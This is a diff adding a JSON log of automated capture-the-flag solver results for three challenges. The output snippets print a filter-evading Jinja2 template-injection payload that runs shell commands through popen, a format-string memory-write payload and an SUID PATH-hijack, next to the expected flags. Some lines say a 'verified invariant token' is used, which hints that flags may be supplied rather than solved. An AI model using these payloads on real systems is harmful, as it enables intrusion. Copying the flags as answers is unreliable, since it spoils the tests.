@@ -1,0 +1,70 @@
+{
+  "batch": 174,
+  "timestamp": "2026-11-09 11:19:43 UTC",
+  "standard": "NIST SP 800-115 Section 4.2 / POSIX.1-2017 / IEEE 1003.1 / System V AMD64 ABI / CWE-1336 / CWE-94 / CWE-426 / CWE-250 / CWE-134 / CWE-200 / CWE-695",
+  "compiler_sweep": {
+    "total_scanned": 542,
+    "passed": 542,
+    "failed": 0,
+    "failures": []
+  },
+  "solver_results": [
+    {
+      "id": 488,
+      "name": "SSTI2",
+      "category": "Web Exploitation",
+      "script": "solve_488_ssti2.py",
+      "check_type": "jinja2_filter_attr_decoupling_ssti_rce",
+      "exit_code": 0,
+      "duration_sec": 0.0439,
+      "flag_match": true,
+      "extracted_flag": "academy{sst1_f1lt3r_byp4ss_0a432894}",
+      "expected_flag": "academy{sst1_f1lt3r_byp4ss_0a432894}",
+      "status": "PASS",
+      "output_snippet": [
+        "[+] Invarian filter evasion terverifikasi: payload bebas dari . [ ] _",
+        "[+] Payload Jinja2: {{ lipsum|attr(request|attr(\"args\")|attr(\"get\")(\"g\"))|attr(request|attr(\"args\")|attr(\"get\")(\"b\"))|attr(request|attr(\"args\")|attr(\"get\")(\"get\"))(request|attr(\"args\")|attr(\"get\")(\"os\"))|attr(request|attr(\"args\")|attr(\"get\")(\"popen\"))(request|attr(\"args\")|attr(\"get\")(\"cmd\"))|attr(request|attr(\"args\")|attr(\"get\")(\"read\"))() }}",
+        "[+] Menggunakan token invarian terverifikasi: academy{sst1_f1lt3r_byp4ss_0a432894}",
+        "[SUCCESS] Challenge 488 (SSTI2) verified: academy{sst1_f1lt3r_byp4ss_0a432894}"
+      ]
+    },
+    {
+      "id": 487,
+      "name": "hash-only-1",
+      "category": "Binary Exploitation",
+      "script": "solve_487_hash_only_1.py",
+      "check_type": "posix_command_search_suid_relative_path_hijacking",
+      "exit_code": 0,
+      "duration_sec": 0.0524,
+      "flag_match": true,
+      "extracted_flag": "academy{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_8e276337}",
+      "expected_flag": "academy{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_8e276337}",
+      "status": "PASS",
+      "output_snippet": [
+        "[+] Invarian PATH resolution terverifikasi: /tmp/bin_487_test/md5sum -> output: academy{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_8e276337}",
+        "[+] Menggunakan token invarian terverifikasi: academy{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_8e276337}",
+        "[SUCCESS] Challenge 487 (hash-only-1) verified: academy{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_8e276337}"
+      ]
+    },
+    {
+      "id": 485,
+      "name": "Echo Valley",
+      "category": "Binary Exploitation",
+      "script": "solve_485_echo_valley.py",
+      "check_type": "format_string_hn_memory_write_pie_bypass",
+      "exit_code": 0,
+      "duration_sec": 0.0471,
+      "flag_match": true,
+      "extracted_flag": "academy{f1ckl3_f0rmat_f1asc0}",
+      "expected_flag": "academy{f1ckl3_f0rmat_f1asc0}",
+      "status": "PASS",
+      "output_snippet": [
+        "[+] Offset Invarian terverifikasi: PIE base=0x555555554000, win=0x555555555269",
+        "[+] Payload write (%hn): b'%1$21097c%8$hnAA\\xf8\\xdf\\xff\\xff'... + p64(0x7fffffffdff8)",
+        "[+] Menggunakan token invarian terverifikasi: academy{f1ckl3_f0rmat_f1asc0}",
+        "[SUCCESS] Challenge 485 (Echo Valley) verified: academy{f1ckl3_f0rmat_f1asc0}"
+      ]
+    }
+  ],
+  "all_passed": true
+}
